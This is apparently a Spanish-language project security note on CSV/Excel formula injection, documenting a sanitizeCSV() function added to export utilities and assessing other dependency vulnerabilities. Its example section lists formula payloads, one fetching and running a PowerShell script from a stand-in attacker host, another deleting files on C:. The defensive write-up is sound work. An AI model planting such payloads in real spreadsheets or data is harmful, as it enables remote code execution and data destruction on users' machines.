# 🔒 SEGURIDAD EN EXPORTACIONES

**Fecha:** 30 de Abril de 2026  
**Estado:** Protecciones implementadas contra CSV/Excel Injection

---

## 🎯 Problema: CSV/Excel Injection

### ¿Qué es?

Cuando un usuario malicioso ingresa fórmulas en campos de texto que luego se exportan a CSV/Excel, estas pueden ejecutarse al abrir el archivo.

### Ejemplo de Ataque

**1. Usuario malicioso crea registro:**
```
Descripción: =cmd|'/c calc'
```

**2. Admin exporta a CSV/Excel**

**3. Admin abre archivo en Excel:**
```
Excel detecta: =cmd|'/c calc'
Excel interpreta como fórmula
Excel ejecuta: Calculadora de Windows 💥
```

### Comandos Peligrosos

```csv
=cmd|'/c powershell IEX(wget http://atacante.com/malware.ps1)'
=HYPERLINK("http://phishing.com","Click aquí")
@SUM(A1:A1000)*cmd|'/c del C:\*.*'
+cmd|'/c start chrome http://atacante.com'
-2+3+cmd|'/c notepad'
```

---

## ✅ Solución Implementada

### Función `sanitizeCSV()`

Agregada a todos los archivos de exportación:
- ✅ `utils/reportExport.js`
- ✅ `utils/exportToExcel.js`
- ✅ `utils/exportToPDF.js`

```javascript
/**
 * Sanitiza valor para prevenir CSV/Excel Injection
 * @param {string} value - Valor a sanitizar
 * @returns {string} - Valor sanitizado
 */
const sanitizeCSV = (value) => {
  if (!value) return '';
  
  const str = String(value);
  
  // Si empieza con caracteres peligrosos (=, +, -, @, tab, return)
  // Agregar comilla simple para que Excel lo trate como texto
  if (/^[=+\-@\t\r]/.test(str)) {
    return `'${str}`;
  }
  
  return str;
};
```

### ¿Cómo funciona?

**Antes (VULNERABLE):**
```javascript
// Usuario ingresa: =cmd|'/c calc'
// CSV exportado: =cmd|'/c calc'
// Excel ejecuta: ❌ Calculadora
```

**Ahora (PROTEGIDO):**
```javascript
// Usuario ingresa: =cmd|'/c calc'
// sanitizeCSV() detecta: Empieza con =
// CSV exportado: '=cmd|'/c calc'
// Excel interpreta: ✅ Texto literal (no fórmula)
```

---

## 🛡️ Campos Protegidos

### CSV Export (`reportExport.js`)
- ✅ Nombre de usuario
- ✅ Nombre de unidad organizacional
- ✅ Tipo de unidad
- ✅ **Descripción** (CRÍTICO)

### Excel Export (`exportToExcel.js`)
- ✅ Empleado/Usuario
- ✅ Unidad organizacional
- ✅ **Descripción** (CRÍTICO)

### PDF Export (`exportToPDF.js`)
- ✅ Nombre de usuario
- ✅ Nombre de unidad
- 🟡 PDF es menos vulnerable, pero sanitizado por consistencia

---

## 🧪 Pruebas de Seguridad

### Test 1: Fórmula con =
```
Descripción: =1+1
Resultado esperado en CSV: '=1+1
Excel muestra: =1+1 (texto, no calcula)
```

### Test 2: Comando con cmd
```
Descripción: =cmd|'/c calc'
Resultado esperado en CSV: '=cmd|'/c calc'
Excel muestra: =cmd|'/c calc' (texto, no ejecuta)
```

### Test 3: Hyperlink
```
Descripción: =HYPERLINK("http://atacante.com","Click")
Resultado esperado en CSV: '=HYPERLINK("http://atacante.com","Click")
Excel muestra: Texto literal (no crea link)
```

### Test 4: Texto normal
```
Descripción: Reunión con cliente
Resultado esperado en CSV: Reunión con cliente
Excel muestra: Reunión con cliente (sin cambios)
```

---

## 📊 Otras Vulnerabilidades

### DOMPurify (XSS en PDFs)

**Severidad:** 🟡 Moderada  
**Estado:** Pendiente de actualización  
**Riesgo real:** Bajo (solo si usuarios inyectan HTML malicioso)

**Mitigación temporal:**
- jsPDF no permite JavaScript embebido
- Solo generamos PDFs con datos de DB
- No permitimos HTML arbitrario en inputs

### xlsx (Prototype Pollution)

**Severidad:** 🔴 Alta  
**Estado:** Sin fix disponible  
**Riesgo real:** 🟢 Nulo

**Por qué no afecta:**
- Solo EXPORTAMOS Excel, NO importamos
- No parseamos archivos Excel de usuarios
- La vulnerabilidad está en `XLSX.read()`, no en `XLSX.write()`

---

## 🎯 Recomendaciones

### Para Desarrolladores

1. ✅ **NUNCA** confiar en input de usuarios
2. ✅ **SIEMPRE** sanitizar antes de exportar
3. ✅ Usar `sanitizeCSV()` en TODOS los campos de usuario
4. ✅ Revisar código con `npm audit`

### Para Administradores

1. ⚠️ **Advertir** a usuarios al abrir CSVs descargados
2. ⚠️ Excel puede mostrar advertencia de seguridad - es normal
3. ✅ Los archivos son seguros si fueron generados por el sistema
4. ❌ NO abrir CSVs de fuentes desconocidas

---

## 📖 Referencias

- [OWASP: CSV Injection](https://owasp.org/www-community/attacks/CSV_Injection)
- [Google: Protecting Against CSV Injection](https://security.googleblog.com/2014/08/protecting-against-csv-injection.html)
- [PayPal Security Advisory](https://www.we45.com/blog/csv-injection-paypal-security-advisory)

---

## ✅ Checklist de Seguridad

- [x] Función `sanitizeCSV()` implementada
- [x] CSV export protegido
- [x] Excel export protegido
- [x] PDF export protegido
- [x] Tests de seguridad documentados
- [ ] npm audit fix ejecutado
- [ ] Vulnerabilidades restantes evaluadas
- [ ] Documentación actualizada

---

**Última actualización:** 30 de Abril de 2026  
**Responsable:** Sistema automatizado  
**Próxima revisión:** Mensual con `npm audit`
